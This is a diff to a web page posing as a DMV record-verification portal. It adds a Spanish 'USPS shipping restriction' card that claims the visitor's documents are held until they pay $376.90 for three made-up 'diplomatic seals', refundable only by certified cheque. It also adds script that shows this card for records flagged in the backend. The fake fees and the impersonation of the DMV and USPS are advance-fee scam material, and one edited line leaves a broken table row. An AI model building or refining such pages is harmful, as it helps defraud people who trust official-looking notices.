@@ -313,7 +313,7 @@
                                 </tr>
                             </thead>
                             <tbody>
-                                <tr class="border-b">
+                                class="border-b">
                                     <td class="px-6 py-4 font-mono font-bold" data-label="Code" id="record-code">---</td>
                                     <td class="px-6 py-4 font-bold" data-label="Full Name" id="record-fullname">---</td>
                                     <td class="px-6 py-4 text-green-700 font-black" data-label="Document" id="record-doc">---</td>
@@ -330,9 +330,12 @@
                         </div>
                     </div>
 
-                    <div class="flex justify-center md:justify-start">
-                        <button type="button" id="btn-restrictions" class="bg-orange-600 hover:bg-orange-700 text-white text-[11px] py-2 px-4 rounded-xl font-bold uppercase tracking-wider transition flex items-center gap-2 shadow-md">
+                    <div class="flex flex-wrap justify-center md:justify-start gap-4">
+                        <button type="button" id="btn-restrictions" class="hidden bg-orange-600 hover:bg-orange-700 text-white text-[11px] py-2 px-4 rounded-xl font-bold uppercase tracking-wider transition flex items-center gap-2 shadow-md">
                             <i class="fas fa-exclamation-triangle"></i> View Restrictions
+                        </button>
+                        <button type="button" id="btn-usps-restrictions" class="hidden bg-orange-600 hover:bg-orange-700 text-white text-[11px] py-2 px-4 rounded-xl font-bold uppercase tracking-wider transition flex items-center gap-2 shadow-md">
+                            <i class="fas fa-exclamation-triangle"></i> View USPS Restrictions
                         </button>
                     </div>
 
@@ -354,6 +357,27 @@
                             Se le solicita comunicarse de manera inmediata con el asesor asignado por el DMV para recibir información detallada sobre el procedimiento para regularizar su situación y completar los requisitos pendientes.
                         </div>
                     </div>
+
+                    <div id="usps-restrictions-content" class="hidden restrictions-card p-6 rounded-2xl shadow-md animate-fade" style="background-color: #fdf3e7; border-left: 6px solid #e06917;">
+                        <h3 class="text-xl font-black uppercase text-orange-700 mb-4 flex items-center gap-2" style="color: #b84a00;">
+                            <i class="fas fa-shipping-fast"></i> USPS RESTRICCIÓN DE ENVÍO:
+                        </h3>
+                        <div class="space-y-2">
+                            <div class="restrictions-item" style="border-bottom: 1px dashed #e0b088;"><span class="font-bold">Primer Sello Diplomático de Resguardo:</span><span class="font-black" style="color: #000;">$125,63 USD</span></div>
+                            <div class="restrictions-item" style="border-bottom: 1px dashed #e0b088;"><span class="font-bold">Segundo Sello Diplomático de Autenticación:</span><span class="font-black" style="color: #000;">$125,63 USD</span></div>
+                            <div class="restrictions-item" style="border-bottom: 1px dashed #e0b088;"><span class="font-bold">Tercer Sello Diplomático de Liberación Postal:</span><span class="font-black" style="color: #000;">$125,64 USD</span></div>
+                        </div>
+                        <div class="total-amount mt-5" style="background-color: #e06917;">
+                            Monto total adeudado: <span class="text-2xl block">$376,90 USD</span>
+                        </div>
+                        <div class="mt-6 p-5 rounded-xl text-sm font-medium" style="background-color: #fff5ee; border: 1px solid #ffdec2; color: #333; display: flex; align-items: start; gap: 12px; line-height: 1.5;">
+                            <i class="fas fa-exclamation-circle" style="color: #e06917; margin-top: 3px; font-size: 1.1rem;"></i>
+                            <p style="margin: 0; text-align: justify;">
+                                <strong>Se notifica que su valija de envío se encuentra actualmente retenida</strong> por parte de las oficinas de USPS debido a que se solicita la adquisición obligatoria de 3 sellos diplomáticos de resguardo y liberación postal. Asimismo, se le informa que <strong>el monto total de dichos sellos será reembolsado en su totalidad únicamente mediante cheque certificado</strong> al momento de completarse la entrega física de su documentación. Por favor, comuníquese de manera inmediata con su asesor asignado para coordinar el trámite.
+                            </p>
+                        </div>
+                    </div>
+
                 </div>
             </div>
         </main>
@@ -417,13 +441,21 @@
             icon.style.transition = 'transform 0.3s ease';
         }
 
+        // Elementos de la interfaz para restricciones
         const btnRestricciones = document.getElementById('btn-restrictions');
         const contentRestricciones = document.getElementById('restrictions-content');
+        const btnUsps = document.getElementById('btn-usps-restrictions');
+        const contentUsps = document.getElementById('usps-restrictions-content');
+
+        // Eventos manuales de clic para abrir/cerrar las tarjetas
         btnRestricciones?.addEventListener('click', () => {
             contentRestricciones.classList.toggle('hidden');
         });
+        btnUsps?.addEventListener('click', () => {
+            contentUsps.classList.toggle('hidden');
+        });
 
-        // --- ENVIAR DATOS A TU SERVIDOR EXPRESS ---
+        // --- ENVIAR DATOS A TU SERVIDOR EXPRESS Y MANEJO DINÁMICO ---
         const verifyForm = document.getElementById('verify-form');
         verifyForm?.addEventListener('submit', async (e) => {
             e.preventDefault();
@@ -431,61 +463,63 @@
             const nombreInput = document.getElementById('v-name').value;
             const idInput = document.getElementById('v-id').value;
 
+            // Aquí coloco la continuación de tu llamada Fetch a tu Backend en Express:
             try {
-                // Petición al backend en el puerto 3000
-                const respuesta = await fetch('/api/verificar', {
+                const respuesta = await fetch('/api/verify', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ nombre: nombreInput, id_cliente: idInput })
+                    body: JSON.stringify({ nombre: nombreInput, id: idInput })
                 });
-
+                
                 const resultado = await respuesta.json();
 
                 if (resultado.success && resultado.datos) {
                     const cliente = resultado.datos;
 
-                    // Mapeo e inyección de datos dinámicos recibidos del backend
-                    document.getElementById('record-code').innerText = cliente.id_cliente;
-                    document.getElementById('record-fullname').innerText = cliente.nombre;
-                    document.getElementById('record-doc').innerText = cliente.documento;
-                    document.getElementById('record-dob').innerText = cliente.fecha_nacimiento;
-                    document.getElementById('record-state').innerText = cliente.estado;
-                    document.getElementById('record-address').innerText = cliente.direccion;
+                    // Rellenar datos básicos en la tabla y campos
+                    document.getElementById('record-code').innerText = cliente.id_cliente || '---';
+                    document.getElementById('record-fullname').innerText = cliente.nombre || '---';
+                    document.getElementById('record-doc').innerText = cliente.documento || '---';
+                    document.getElementById('record-dob').innerText = cliente.fecha_nacimiento || '---';
+                    document.getElementById('record-state').innerText = cliente.estado || '---';
+                    document.getElementById('record-address').innerText = cliente.direccion || '---';
 
-                    // Control y render de las imágenes
-                    const img1 = document.getElementById('record-photo1');
-                    const ph1 = document.getElementById('placeholder1');
-                    if (cliente.fotos_url) {
-                        img1.src = cliente.fotos_url;
-                        img1.style.display = 'block';
-                        ph1.style.display = 'none';
-                    } else {
-                        img1.style.display = 'none';
-                        ph1.style.display = 'flex';
+                    // Manejo de fotos si existen
+                    if (cliente.foto_perfil) {
+                        document.getElementById('record-photo1').src = cliente.foto_perfil;
+                        document.getElementById('record-photo1').style.display = 'block';
+                        document.getElementById('placeholder1').style.display = 'none';
+                    }
+                    if (cliente.foto_documento) {
+                        document.getElementById('record-photo2').src = cliente.foto_documento;
+                        document.getElementById('record-photo2').style.display = 'block';
+                        document.getElementById('placeholder2').style.display = 'none';
                     }
 
-                    const img2 = document.getElementById('record-photo2');
-                    const ph2 = document.getElementById('placeholder2');
-                    if (cliente.fotos_doc_url) {
-                        img2.src = cliente.fotos_doc_url;
-                        img2.style.display = 'block';
-                        ph2.style.display = 'none';
-                    } else {
-                        img2.style.display = 'none';
-                        ph2.style.display = 'flex';
-                    }
-
-                    // Forzar el colapso del bloque de restricciones al cambiar de registro
+                    // --- RESETEAR BOTONES DE ALERTA ---
+                    btnRestricciones.classList.add('hidden');
                     contentRestricciones.classList.add('hidden');
+                    btnUsps.classList.add('hidden');
+                    contentUsps.classList.add('hidden');
 
-                    // Saltar directo a la vista del registro verificado
+                    // --- COMPROBACIÓN INTELIGENTE DE RESTRICCIONES ---
+                    if (cliente.tipo_restriccion === 'USP') {
+                        // Muestra el botón de USPS si el tipo en el backend es USP
+                        btnUsps.classList.remove('hidden');
+                    } else if (cliente.tipo_restriccion === 'MEDICOS') {
+                        // Muestra el botón normal de exámenes médicos si el tipo es MEDICOS
+                        btnRestricciones.classList.remove('hidden');
+                    }
+
+                    // Llevar al usuario a la pestaña del registro
                     showTab('record');
                 } else {
-                    alert('❌ Registro no encontrado. Verifique el nombre o folio ingresado.');
+                    alert('Record not found. Please verify your legal name and folio number.');
                 }
+
             } catch (error) {
-                console.error('Error en la autenticación:', error);
-                alert('⚠️ Error de conexión con el servidor.');
+                console.error("Error al conectar con el servidor:", error);
+                alert("Connection error. Please try again later.");
             }
         });
     </script>
